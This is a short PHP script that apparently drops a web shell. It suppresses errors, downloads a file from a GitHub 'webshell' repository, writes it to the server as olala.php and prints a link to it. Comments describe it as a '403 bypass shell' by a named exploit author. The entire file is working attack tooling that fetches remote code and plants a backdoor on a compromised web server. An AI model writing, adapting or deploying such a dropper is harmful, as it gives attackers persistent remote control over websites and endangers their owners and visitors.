<?php
error_reporting(0);
$shell = fopen("olala.php", "w");
$file_shell = file_get_contents("https://raw.githubusercontent.com/AzhariKun/webshell/main/flx.php");
fwrite($shell, $file_shell);
fclose($shell);
echo "<a href='olala.php'>Here</a>";

	//Bypass Shell 403
	//Coded By ./EcchiExploit
	//Original Source Code In Top
	
?>
